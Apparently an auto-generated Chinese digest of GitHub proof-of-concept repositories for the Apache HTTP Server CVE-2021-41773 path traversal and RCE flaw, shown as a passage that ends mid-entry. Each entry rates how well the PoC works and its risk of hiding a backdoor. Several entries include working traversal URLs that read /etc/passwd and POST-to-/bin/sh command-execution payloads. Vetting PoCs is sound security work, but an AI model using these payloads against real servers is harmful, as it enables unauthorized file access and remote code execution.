**来源**: [CVE-2021-41773-adrianmafandy_CVE-2021-41773.md](../2021/CVE-2021-41773-adrianmafandy_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server 2.4.49 Path Traversal & RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并启用了 CGI 脚本支持，并且Alias配置的目录没有 require all denied 限制。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，如果配置不当，可能导致远程代码执行。攻击者可以利用路径遍历绕过 Alias 指令的限制，访问服务器上的任意文件。如果目标服务器启用了 CGI 脚本，并且被访问的目录中存在可执行的 CGI 脚本，攻击者就可以通过构造恶意的 URL 来执行任意代码。

**有效性：**
提供的 POC 代码旨在利用此漏洞。`exploit.py` 脚本首先尝试通过发送包含路径遍历序列的 HTTP 请求来验证目标是否易受攻击，例如 `/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`。如果从 `/etc/passwd` 文件中检测到 "root:" 和 "bin/" 字符串，则认为目标易受攻击。然后，该脚本尝试利用漏洞通过反向 shell 在目标上执行任意代码。

**利用方式：**
1.  使用路径遍历序列（例如，`.%2e` 或 URL 编码的 `.%2532%2565`）来绕过目录限制。
2.  尝试读取敏感文件，如 `/etc/passwd`，以验证漏洞的存在。
3.  如果服务器配置允许，则利用 CGI 脚本执行任意命令。这通常涉及构造包含命令的 URL，并将该 URL 发送到易受攻击的服务器。
4. 设置监听器，等待反向shell连接。

**投毒风险：**
虽然主要代码看起来直接实现了漏洞利用，但仍然存在一定的投毒风险。可能性大约为 10%。

*   依赖关系：`exploit.py` 脚本依赖于 `requests` 库。虽然 `requests` 是一个流行的 Python 库，但存在供应链攻击的风险。恶意攻击者可能会尝试污染 `requests` 库或类似的依赖项，从而在不知不觉中将恶意代码引入到 `exploit.py` 中。
*   CGI配置的判断：如果目标服务器上未启用 CGI 或 CGI 配置不正确，该漏洞可能无法利用进行 RCE。POC代码中关于CGI的利用可能无法执行.
*   代码审查：在执行任何未经审核的代码（包括此 POC）之前，务必进行彻底的代码审查，以确保其不包含恶意功能。特别注意反向 shell 部分，确保它只执行预期命令。
*  作者动机: 无法完全信任代码作者的真实目的。尽管代码可能有效利用漏洞，但作者可能有意或无意地包含后门或恶意代码。
* 编码问题：URL 编码和解码可能存在问题，导致意外行为。

**项目地址:** [adrianmafandy/CVE-2021-41773](https://github.com/adrianmafandy/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #19

**来源**: [CVE-2021-41773-aqiao-jashell_CVE-2021-41773.md](../2021/CVE-2021-41773-aqiao-jashell_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal / Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，并且配置允许CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 和 2.4.50 版本中存在的路径遍历漏洞。攻击者可以利用此漏洞，通过构造特殊的 URL，读取服务器上受限目录之外的文件。如果服务器上启用了 CGI 脚本执行，则攻击者可以进一步利用此漏洞执行任意代码。

**有效性:**
根据漏洞库信息，搜索引擎结果，以及漏洞利用代码，提供的POC代码是有效的。漏洞库信息和搜索结果都表明此漏洞已被公开利用。

**投毒风险:**
提供的Go语言漏洞利用代码，主要功能是利用路径遍历漏洞读取`/etc/passwd`文件或执行命令。虽然代码本身实现了漏洞验证和利用功能，但仍然存在一定的投毒风险。

1.  **依赖风险:** Go程序需要编译，编译过程中可能引入恶意依赖。但是本项目代码量较小，依赖风险较低。
2.  **后门代码:** 检查代码后，发现其中并没有明显的恶意代码或后门。然而，攻击者可以修改代码以包含恶意功能，例如上传受害服务器的信息或执行其他恶意操作。
3.  **供应链风险:** 代码托管在第三方平台（GitHub），存在被篡改的风险。如果从不可信的来源下载代码，可能会下载到被修改过的恶意版本。

综合考虑，该仓库存在10%的投毒风险，主要来自潜在的依赖污染和代码篡改。

**利用方式:**
该漏洞的利用方式主要分以下几步：

1.  **路径遍历:** 攻击者构造包含`/.%2e`的恶意URL，尝试绕过Apache的路径规范化检查，从而访问服务器上任意文件。
2.  **信息泄露:** 如果路径遍历成功，攻击者可以读取敏感文件，例如`/etc/passwd`，获取系统用户信息。
3.  **远程代码执行:** 如果服务器启用了CGI脚本，攻击者可以通过POST请求将恶意命令传递给`sh`执行，从而实现远程代码执行。 例如，可以发送包含 `echo; <command>` 的POST请求到 `/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh`。

**项目地址:** [aqiao-jashell/CVE-2021-41773](https://github.com/aqiao-jashell/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #20

**来源**: [CVE-2021-41773-ashique-thaha_CVE-2021-41773-POC.md](../2021/CVE-2021-41773-ashique-thaha_CVE-2021-41773-POC.md)

## CVE-2021-41773-Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历（Path Traversal）/远程代码执行（RCE）

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并可能需要启用`mod_cgi`模块且存在`Require all granted`配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞。该漏洞源于 `ap_normalize_path` 函数在路径规范化处理上的缺陷，允许攻击者通过构造包含 URL 编码字符（如 `.%2e`）的恶意 URL，绕过路径遍历保护机制，访问服务器文件系统上受限目录之外的文件。

**漏洞利用方式：**

1.  **路径遍历：** 攻击者利用 `.%2e` 绕过路径规范化，构造恶意 URL 以访问任意文件。例如，`http://target/cgi-bin/.%2e/.%2e/.%2e/etc/passwd` 可以用来尝试读取 `/etc/passwd` 文件。

2.  **远程代码执行（RCE）：** 如果服务器启用了 `mod_cgi` 模块，攻击者可以通过上传恶意 CGI 脚本并利用路径遍历漏洞执行该脚本，从而实现远程代码执行。这通常需要结合服务器配置中 `cgi-bin` 目录的 `Require all granted` 指令。

**有效性：**

根据漏洞库信息和搜索结果，该漏洞已在野外被利用，POC 代码的存在进一步验证了其有效性。提供的 README.md 文件详细解释了漏洞原理和利用方法，并提供了搭建漏洞环境的步骤。

**投毒风险：**

虽然提供的 README.md 文件主要包含漏洞说明和环境搭建指导，但是依然存在一定的投毒风险。主要考虑到，如果攻击者修改了环境搭建脚本，例如在安装过程中植入后门，则可能导致受害者搭建一个包含恶意代码的 Apache 服务器。所以需要人工审核确认脚本的安全性，这里认为存在10%的投毒风险。

**总结：**

该漏洞的利用依赖于特定的 Apache 版本和服务器配置。成功利用该漏洞可能导致严重的后果，包括敏感信息泄露和远程代码执行。用户应尽快升级 Apache HTTP Server 版本以修复此漏洞。

**项目地址:** [ashique-thaha/CVE-2021-41773-POC](https://github.com/ashique-thaha/CVE-2021-41773-POC)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #21

**来源**: [CVE-2021-41773-belajarqywok_CVE-2021-41773-MSF.md](../2021/CVE-2021-41773-belajarqywok_CVE-2021-41773-MSF.md)

## CVE-2021-41773 Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行存在漏洞的Apache HTTP Server 2.4.49版本，并且Alias-like 指令配置不当，未对外部文件进行访问限制，同时开启了CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 漏洞是 Apache HTTP Server 2.4.49 版本中存在的一个路径遍历漏洞。攻击者可以通过构造包含特殊字符（如`.%%32%65`）的URL，绕过服务器的路径规范化检查，从而访问到Alias-like指令配置目录以外的文件。如果目标服务器未对这些目录的文件进行访问限制（`require all denied`），攻击者就能读取敏感信息。更进一步，如果服务器允许在这些路径下执行CGI脚本，攻击者就可以实现远程代码执行。

**有效性分析：**

漏洞库信息和搜索结果均表明该漏洞已在野外被利用，PoC代码的存在也证实了其可利用性。

**利用方式分析：**

根据漏洞描述和提供的PoC代码，可以总结出以下利用方式：

1.  **路径遍历攻击：** 攻击者构造包含特殊编码的路径，例如：`/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd`尝试读取`/etc/passwd`等敏感文件。
2.  **文件读取：**  如果服务器没有对目标文件进行访问限制，攻击者可以直接读取到文件内容。
3.  **远程代码执行（RCE）：** 如果目标路径允许执行CGI脚本，攻击者可以上传恶意脚本，然后通过路径遍历漏洞执行该脚本，从而实现远程代码执行。

**投毒风险分析：**

提供的PoC代码主要包含以下文件：

*   `1.rb`：一个 Metasploit 模块，尝试通过 GET 请求访问特定 URI（`http://192.168.137.1/cgi-bin/.%%32%65/htdocs/hacklab/websekolah/upload/test.txt`）。该模块的主要目的是读取文件，没有明显的恶意行为。
*   `2.rb`：另一个 Metasploit 模块，尝试通过 GET 请求获取 PDF 文件内容 (tugas.pdf)。该模块的主要目的是读取文件，没有明显的恶意行为。
*   `Makefile`：包含 Maven 命令，用于编译和执行 Java 代码。该命令执行 `com.shell.ReverseShell` 类，并传递一些参数，包括文件名、IP 地址、路径等。**`com.shell.ReverseShell` 存在潜在的投毒风险，因为它可能包含反向 shell 或其他恶意功能。**
*   `apache_rce.rb`：Metasploit 模块，未完全贴出，但是根据文件名推测是进行远程代码执行的模块，存在一定风险。

综合来看，`Makefile` 中调用的 Java 类 `com.shell.ReverseShell` 是最可疑的部分。如果该类包含恶意代码，例如反向 shell，那么执行此 Makefile 就可能导致受害者系统被控制。其他rb文件目前主要进行get请求，风险较低。

**风险评估：**

虽然大部分代码看起来是用于漏洞利用，但是 `Makefile` 中调用的`com.shell.ReverseShell` 存在潜在风险，如果里面包含恶意代码，比如反向 shell，则有被投毒的可能。因此，存在一定的投毒风险，比例估计为10%。

**项目地址:** [belajarqywok/CVE-2021-41773-MSF](https://github.com/belajarqywok/CVE-2021-41773-MSF)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #22

**来源**: [CVE-2021-41773-blackn0te_Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution.md](../2021/CVE-2021-41773-blackn0te_Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution.md)

## CVE-2021-41773/CVE-2021-42013 - Apache HTTP Server Path Traversal and RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49 和 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，且存在可执行的CGI脚本目录

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773 和 CVE-2021-42013 是 Apache HTTP Server 2.4.49 和 2.4.50 中的路径遍历漏洞。攻击者可以利用这些漏洞，通过构造特殊的URL来访问服务器上的任意文件，如果服务器启用了CGI脚本执行，则可能导致远程代码执行。

**有效性：**
提供的PoC代码（`exploit.py`）是有效的。它包含利用路径遍历读取任意文件和利用CGI执行远程代码的payload。脚本首先检查目标服务器是否易受攻击（通过检查`Server`头），然后根据用户选择的选项执行相应的攻击。

**投毒风险：**
分析提供的PoC代码，没有发现明显的投毒代码。代码结构清晰，功能明确，主要是构造恶意请求来利用漏洞。脚本中的操作都是为了验证和利用漏洞，没有发现任何隐藏的恶意行为。
投毒风险评估：0%

**利用方式：**
1.  **路径遍历：** 攻击者通过在URL中使用经过特殊编码的路径（例如，`.%2e/%2e%2e`）来绕过服务器的路径检查，从而访问受限目录之外的文件。PoC代码中提供了两个路径遍历Payload `payload1`和`payload2`，利用 `GET` 请求读取文件内容。
2.  **远程代码执行：** 如果服务器配置允许执行CGI脚本，攻击者可以通过路径遍历访问到`bin/sh`，然后通过POST请求将命令作为数据传递给`bin/sh`执行。PoC代码中构造了包含命令的POST请求，利用`req.Session()`和`req.Request()`发送请求并接收响应，实现交互式shell。

**总结：**
该漏洞的利用需要目标服务器存在漏洞版本（2.4.49或2.4.50），并且在路径遍历访问到文件之后，如果服务器配置允许，可以进一步利用CGI执行进行远程代码执行。提供的PoC代码可以成功验证并利用该漏洞，未发现投毒风险。

**项目地址:** [blackn0te/Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution](https://github.com/blackn0te/Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #23

**来源**: [CVE-2021-41773-blu3ming_PoC-CVE-2021-41773.md](../2021/CVE-2021-41773-blu3ming_PoC-CVE-2021-41773.md)

## CVE-2021-41773 Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且受影响的Alias-like指令配置允许访问受限目录外的文件，同时CGI脚本未被禁用。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的一个路径遍历漏洞。该漏洞源于Apache HTTP Server对路径规范化处理的缺陷。攻击者可以通过构造包含URL编码的路径遍历序列的恶意HTTP请求，绕过服务器的安全检查，读取服务器上任意文件，甚至可能执行任意代码。

**有效性分析：**

提供的PoC代码通过构造包含`/.%2e/%2e%2e/%2e%2e/%2e%2e/`的URL，利用Apache HTTP Server 2.4.49的路径遍历漏洞读取指定文件。PoC代码使用`urllib3`库发送HTTP请求，避免了`requests`库自动URL规范化导致的利用失败。
根据漏洞库信息、搜索引擎结果和PoC代码，可以判断该PoC代码有效。

**投毒风险分析：**

对提供的PoC代码进行分析，主要包括以下几个文件：

*   `README.md`: 描述了漏洞的详细信息、利用方法和示例。没有发现恶意代码。
*   `cve-2021-41773.py`: 漏洞利用脚本。该脚本的功能是发送包含恶意路径的HTTP请求，读取指定文件。没有发现明显的恶意代码，但存在潜在风险，即攻击者可能利用该脚本读取服务器上的敏感信息，并进行进一步的攻击。不过从代码本身来看，功能单一，不包含任何额外的后门或者恶意功能。
*   `requirements.txt`: 声明了所需的Python依赖库，包括`requests`和`urllib3`。这两个库都是常用的Python库，没有发现恶意库。

综合分析，该仓库中存在作者隐藏的投毒代码的可能性较低，但不能完全排除攻击者利用该脚本进行恶意活动的风险。

**利用方式：**

1.  **确定目标服务器：** 确定运行Apache HTTP Server 2.4.49的目标服务器。
2.  **检查配置：** 检查目标服务器的`Alias-like`指令配置，确认是否存在允许访问受限目录外的文件的配置。
3.  **构造恶意URL：** 构造包含URL编码的路径遍历序列的恶意URL，例如：`http://target/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd`。
4.  **发送HTTP请求：** 使用PoC脚本或其他工具发送包含恶意URL的HTTP请求。
5.  **读取文件：** 如果漏洞利用成功，服务器将返回指定文件的内容。
6. **远程代码执行：** 如果CGI脚本被允许执行，攻击者可以上传一个恶意的CGI脚本并执行，从而实现远程代码执行。

**项目地址:** [blu3ming/PoC-CVE-2021-41773](https://github.com/blu3ming/PoC-CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #24

**来源**: [CVE-2021-41773-charanvoonna_CVE-2021-41773.md](../2021/CVE-2021-41773-charanvoonna_CVE-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49版本，并且配置允许CGI脚本执行

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中。该漏洞是由于对路径规范化处理的更改存在缺陷导致。攻击者可以利用路径遍历攻击将 URL 映射到 Alias 指令配置目录之外的文件。如果这些目录之外的文件没有受到默认配置 "require all denied" 的保护，则请求可能会成功。如果为这些别名路径启用了 CGI 脚本，则可能允许远程代码执行。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且已被广泛利用。提供的 Dockerfile 和 README.md 文件提供了一个可行的漏洞利用方式。

**利用方式：**
1.  **路径遍历：** 攻击者可以通过构造包含 `..` 或 URL 编码的 `..%2f` 的恶意 URL，绕过服务器的路径检查，访问受限文件。
2.  **CGI 执行：** 如果目标服务器启用了 CGI 脚本执行，攻击者可以通过路径遍历访问 CGI 脚本，并执行任意代码。

**POC 代码分析：**

*   **Dockerfile:** 该 Dockerfile 用于构建一个存在 CVE-2021-41773 漏洞的 Apache HTTP Server 2.4.49 环境。
    *   `FROM httpd:2.4.49`：指定使用 Apache HTTP Server 2.4.49 镜像作为基础镜像。
    *   `RUN sed -i 's/#LoadModule cgi_module/LoadModule cgi_module/' /usr/local/apache2/conf/httpd.conf`：启用 CGI 模块。
    *   `RUN echo ...`：配置 CGI 目录，允许执行 CGI 脚本。
    *   `RUN echo "AllowEncodedSlashes On" >> /usr/local/apache2/conf/httpd.conf`：允许 URL 中包含编码的斜杠，这是利用该漏洞的关键。
    *   `COPY test.cgi /usr/local/apache2/cgi-bin/test.cgi`：复制一个测试 CGI 脚本到 CGI 目录下。
    *   `RUN chmod +x /usr/local/apache2/cgi-bin/test.cgi`：为测试 CGI 脚本添加执行权限。
*   **README.md:** 该文件描述了 CVE-2021-41773 漏洞的细节，以及如何使用 Nmap NSE 脚本检测该漏洞。提供了 Nmap 脚本的架构、payload 设置、HTTP 请求和响应处理、输出格式和错误处理。

**投毒风险：**
提供的 Dockerfile 主要用于搭建漏洞环境以进行验证，风险极低。它本身没有包含恶意代码。
虽然 *test.cgi* 文件内容未知，这里假设 *test.cgi* 为安全的代码，否则投毒的概率会升高。
综合评估投毒风险为 1%。


**项目地址:** [charanvoonna/CVE-2021-41773](https://github.com/charanvoonna/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #25

**来源**: [CVE-2021-41773-dileepdkumar_LayarKacaSiber-CVE-2021-41773.md](../2021/CVE-2021-41773-dileepdkumar_LayarKacaSiber-CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution (RCE)

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未经身份验证的攻击者读取任意文件或执行任意代码。

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并且CGI脚本已启用。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中的一个路径遍历漏洞。该漏洞源于对路径规范化的更改，使得攻击者可以使用路径遍历攻击将URL映射到Alias-like指令配置的目录之外的文件。如果这些目录之外的文件没有受到默认配置"require all denied"的保护，请求可能会成功。如果CGI脚本对这些别名路径启用，则可能导致远程代码执行。

**利用方式：**
攻击者可以构造包含编码后的路径遍历字符（例如`.%2e`）的HTTP请求，绕过服务器的安全检查，访问服务器文件系统上的任意文件。如果服务器配置允许执行CGI脚本，攻击者可以通过上传恶意脚本并执行来实现远程代码执行。

**有效性：**
提供的PoC代码`exploit.sh`看起来是有效的。它使用`curl`命令发送包含路径遍历序列的请求，并尝试执行指定的命令。Dockerfile和httpd-path-traversal.conf文件配置了一个易受攻击的Apache服务器环境，用于测试路径遍历。

**投毒风险：**
检查提供的文件，`/tmp/59e48ccb9412bd5b9a153d1926dd8eca/README.md`，`/tmp/59e48ccb9412bd5b9a153d1926dd8eca/exploit.sh`，`/tmp/59e48ccb9412bd5b9a153d1926dd8eca/Path Traversal/Dockerfile`，`/tmp/59e48ccb9412bd5b9a153d1926dd8eca/Path Traversal/httpd-path-traversal.conf`。这些文件看起来主要用于演示和利用CVE-2021-41773漏洞。其中，`exploit.sh`脚本存在一定的风险，攻击者可以利用此脚本执行恶意命令。`httpd-path-traversal.conf` 配置，如果被攻击者修改，会导致服务器存在后门，但是从目前的代码来看，投毒风险较低。只有 `exploit.sh`存在可被利用的风险，但这不是作者主动投毒，所以投毒风险很低。

**项目地址:** [dileepdkumar/LayarKacaSiber-CVE-2021-41773](https://github.com/dileepdkumar/LayarKacaSiber-CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #26

**来源**: [CVE-2021-41773-gunzf0x_CVE-2021-41773.md](../2021/CVE-2021-41773-gunzf0x_CVE-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历和RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并启用了cgi-bin目录的执行权限

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 中。攻击者可以通过构造包含特殊编码的 URL，利用路径遍历漏洞访问受限目录之外的文件。如果服务器配置允许 CGI 脚本执行，则可以进一步利用该漏洞执行任意代码。 

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的 PoC 代码，此漏洞利用是有效的。漏洞库中提到该漏洞已在野外被利用，多个搜索结果也证实了该漏洞的存在和潜在危害，并提供了利用示例。PoC 代码实现了利用路径遍历漏洞执行命令的功能。

**投毒风险：**
PoC 代码主要功能是利用漏洞实现远程命令执行。以下是对代码可能存在的投毒风险的分析：

*   **代码结构和功能：** PoC 代码结构清晰，主要包括参数解析、URL 构造和 HTTP 请求发送等功能。这些功能都与漏洞利用直接相关。
*   **潜在的风险点：**  PoC 代码中存在一些潜在的风险点：
    *   `data_payload: str = f"echo Content-Type: text/plain; echo; {args.command}"` ，args.command参数如果被恶意构造，可能会导致执行非预期的系统命令。
        *   虽然`clean_url`函数旨在清理URL，但可能存在绕过的风险。

总体来说，代码的投毒风险较低，大概在5%。主要风险集中在命令执行的参数上，以及URL清洗函数可能存在的绕过。

**利用方式：**
1.  **确定目标：** 找到运行 Apache HTTP Server 2.4.49 的目标服务器，并确认 `cgi-bin` 目录已启用。
2.  **构造 Payload：** 使用包含路径遍历的 URL 和要执行的命令构造 HTTP POST 请求。URL 的基本格式如下：
    ```
    /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh
    ```
    其中，`.%2e` 是 `..` 的 URL 编码，用于绕过路径检查。`bin/sh` 是要执行的 shell 程序的路径。
3.  **发送请求：**  将构造好的 HTTP POST 请求发送到目标服务器。
4.  **获取结果：**  如果漏洞利用成功，服务器将执行指定的命令，并将结果作为 HTTP 响应返回。

**项目地址:** [gunzf0x/CVE-2021-41773](https://github.com/gunzf0x/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #27

**来源**: [CVE-2021-41773-hackedrishi_CTF_WRITEUPS-TryHackMe-CVE-2021-41773-.md](../2021/CVE-2021-41773-hackedrishi_CTF_WRITEUPS-TryHackMe-CVE-2021-41773-.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，且存在Alias-like指令配置不当或CGI脚本启用。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的一个路径穿越漏洞。攻击者可以通过构造包含`..`的恶意URL，绕过Alias-like指令配置的目录限制，访问服务器上的任意文件。如果目标服务器启用了CGI脚本，攻击者可能进一步利用该漏洞执行远程代码。根据漏洞描述，需要特定的配置错误，例如，文件没有被"require all denied"保护。从提供的漏洞利用代码看， 该代码本身是一个 CTF 的 Writeup， 解释了漏洞原理和利用方式，本身不包含恶意代码，但可能存在作者隐藏的后门代码的风险，但是可能性极低。

**有效性：**
该漏洞利用代码(CTF Writeup) 本身不直接用于漏洞利用，而是用于解释该漏洞，根据搜索引擎结果，该漏洞真实存在且被广泛利用。

**投毒风险：**
提供的漏洞利用代码是一个CTF Writeup，主要用于讲解漏洞原理，本身不太可能包含恶意投毒代码， 但为了安全起见， 风险评估为5%。

**利用方式：**
1.  **路径穿越：** 构造包含`..`的URL，例如`/%2e%2e/%2e%2e/%2e%2e/etc/passwd`，尝试访问服务器上的敏感文件，如`/etc/passwd`。
2.  **RCE（如果CGI启用）：**如果服务器配置允许执行CGI脚本，攻击者可以通过上传恶意CGI脚本并执行它，来实现远程代码执行。 需要注意的是，通常需要结合Alias指令的配置不当才能实现。

**利用前提：**
*   Apache HTTP Server版本为2.4.49。
*   目标文件所在目录没有被`require all denied`限制。
*   （可选）服务器启用了CGI脚本，并且Alias指令配置不当。

**项目地址:** [hackedrishi/CTF_WRITEUPS-TryHackMe-CVE-2021-41773-](https://github.com/hackedrishi/CTF_WRITEUPS-TryHackMe-CVE-2021-41773-)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #28

**来源**: [CVE-2021-41773-javaamo_CVE-2021-41773.md](../2021/CVE-2021-41773-javaamo_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行存在漏洞的Apache HTTP Server 2.4.49版本，并启用了cgi-bin目录，且该目录下的文件没有被'require all denied'保护

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-41773 漏洞是 Apache HTTP Server 2.4.49 版本中存在的路径遍历漏洞。攻击者可以通过构造包含特殊字符的 URL，绕过 Alias 类似的指令配置的目录限制，访问到服务器上的任意文件。如果服务器同时启用了 CGI 脚本支持，攻击者甚至可以执行任意代码。

**有效性：**
根据漏洞描述和提供的漏洞利用代码，该漏洞利用是有效的。搜索引擎结果也表明该漏洞已被公开利用。

**投毒风险：**
提供的漏洞利用代码主要由一个shell脚本和一个README文件组成。shell脚本的功能是向目标服务器发送包含恶意路径的HTTP请求，读取指定文件或执行命令。README文件是对漏洞利用代码的说明。
脚本本身存在投毒的可能性较低，风险预估1%。主要风险点在于targets.txt文件，如果攻击者替换了targets.txt中的目标，可能会导致非授权的扫描或者攻击。需要注意的是，该PoC本身就是用于攻击的，因此不能将利用漏洞的代码判定为投毒。

**利用方式：**
1.  准备：准备一个包含目标服务器地址列表的 `targets.txt` 文件。
2.  路径遍历：使用`./50383.sh targets.txt /etc/passwd`尝试读取敏感文件，例如`/etc/passwd`。
3.  远程代码执行：如果目标服务器启用了 CGI，则可以通过类似`./50383.sh targets.txt /bin/sh whoami`的方式执行命令。
   需要注意的是，该POC代码尝试利用路径遍历漏洞，将请求发送到`/cgi-bin/`目录，从而触发CGI脚本的执行，最终达到远程代码执行的目的. 如果CGI未开启，则只能进行文件读取。

**项目地址:** [javaamo/CVE-2021-41773](https://github.com/javaamo/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #29

**来源**: [CVE-2021-41773-jkska23_Additive-Vulnerability-Analysis-CVE-2021-41773.md](../2021/CVE-2021-41773-jkska23_Additive-Vulnerability-Analysis-CVE-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历和文件泄露

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，且Alias配置存在缺陷，允许访问受限目录外的文件，并且可能开启了CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

**有效性分析：**

